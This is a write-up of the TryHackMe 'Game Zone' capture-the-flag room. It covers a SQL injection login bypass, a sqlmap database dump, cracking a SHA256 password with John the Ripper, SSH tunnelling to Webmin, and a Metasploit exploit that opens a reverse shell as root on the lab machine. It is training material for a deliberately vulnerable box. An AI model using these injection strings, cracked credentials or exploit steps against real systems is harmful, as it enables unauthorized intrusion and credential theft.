## TryHackMe Game Zone
---

[Link to TryHackMe Room](https://tryhackme.com/room/gamezone)

Task 1: Deploy the vulnerable machine

IP: 10.10.241.186

```
Nmap scan report for 10.10.241.186
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Task 2: Obtain access via SQLi

- SQL is the standard language for storing, editing, and retrieving data in databases. A query can look like so:
- 	SELECT * FROM users WHERE username = :username AND password := password

In the Game Zone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

By using a SQL injection: ' or 1=1 -- - , as the username and nothing as the password. I authenticates me.

This directs me to portal.php, I am now authenticated using the command. 


Task 3: Using SQLMap

SQLMap is an automatic SQL injection and database takeover tool. 

So the query packet can be intercepted and saved as request.txt or any file name.

```
$ sqlmap -r  /home/joey/ctf/tryhackme/rooms/game\ zone/sql-injection/request.txt --dbms=mysql --dump               

[22:51:45] [INFO] parsing HTTP request from '/home/joey/ctf/tryhackme/rooms/game zone/sql-injection/request.txt'
[22:51:45] [INFO] testing connection to the target URL
[22:51:45] [INFO] checking if the target is protected by some kind of WAF/IPS                                                     
[22:51:45] [INFO] testing if the target URL content is stable
[22:51:46] [INFO] target URL content is stable
[22:51:46] [INFO] testing if POST parameter 'searchitem' is dynamic        
[22:51:46] [WARNING] POST parameter 'searchitem' does not appear to be dynamic

-- SNIP --
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[22:58:41] [INFO] table 'db.users' dumped to CSV file '/home/joey/.local/share/sqlmap/output/10.10.241.186/dump/db/users.csv'
[22:58:41] [INFO] fetching columns for table 'post' in database 'db'
[22:58:41] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[22:58:41] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name| description|
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11| Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.|
| 2  | Marvel Ultimate Alliance 3 | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005 | Best game ever|
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[22:58:41] [INFO] table 'db.post' dumped to CSV file '/home/joey/.local/share/sqlmap/output/10.10.241.186/dump/db/post.csv'
[22:58:41] [INFO] fetched data logged to text files under '/home/joey/.local/share/sqlmap/output/10.10.241.186'

[*] ending @ 22:58:41 /2021-11-24/
```

Task 4: Cracking a password with JohnTheRipper

John the Ripper (JTR) is a password cracker. 

This program works by taking a wordlist and hashing it with a specified algorithm, The encoded password is Sha256.
```
$ john password_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
Created directory: /home/joey/.john

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:01 DONE (2021-11-25 00:01) 0.7299g/s 2128Kp/s 2128Kc/s 2128KC/s vimivi..veluca
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed


$ cat john.pot
$SHA256$ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124


$ ssh agent47@10.10.241.186

The authenticity of host '10.10.241.186 (10.10.241.186)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.241.186' (ED25519) to the list of known hosts.
agent47@10.10.241.186's password: 

user.txt
agent47@gamezone:~$ la
.bash_history  .bash_logout  .bashrc  .cache  .profile  user.txt
agent47@gamezone:~$ cat user.txt 
649ac1{REDACTED}
agent47@gamezone:~$ 
```

Task 5: Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specified that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Goint to localhost:9000 on your machine, will load imgur traffic using your other server. 

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to other server for others to view. 

```
$ ss
```

This tool is used to investigate sockets running on a host.

```
	$ ss -tulpn
	Netid	State		Recv-Q 	Send-Q	Local Address:Port	Peer Address:Port              
	udp		UNCONN		0		0		*:10000				*:*
	udp		UNCONN		0		0		*:68				*:*      
	tcp		LISTEN		0		80		127.0.0.1:3306		*:*
	tcp		LISTEN		0		128		*:10000				*:*
	tcp		LISTEN		0		128		*:22				*:*
	tcp		LISTEN		0		128		:::80				:::*
	tcp		LISTEN		0		128		:::22				:::*
```

There is an exposed port at 10000. This is inaccessible from the local machine so I can tunnel it back to the local machine with an SSH tunnel.

```
	$ ssh -L 10000:localhost:10000 agent47@10.10.241.186

	$ firefox 10.10.241.186:10000

```

I can login with the agent47 username and password.


Task 6: Privilege Escalation with Metasploit

For this part I needed to use the searchsploit to find relevant exploits.
```	
$ searchsploit webmin 1.580
---------------------------------------------------------------------------
 Exploit Title	|  Path

Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)| unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit) | /webapps/47330.rb


$ msfconsole 

search webmin

Matching Modules
================

   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution

$ use exploit/unix/webapp/webmin_show_cgi_exec

$ set RHOSTS 127.0.0.1
$ set LHOST tun0
$ set payload cmd/unix/reverse
$ set SSL false

$ exploit

whoami
root
cd /root/
cat root.txt
a4b945{REDACTED}
```

## Complete

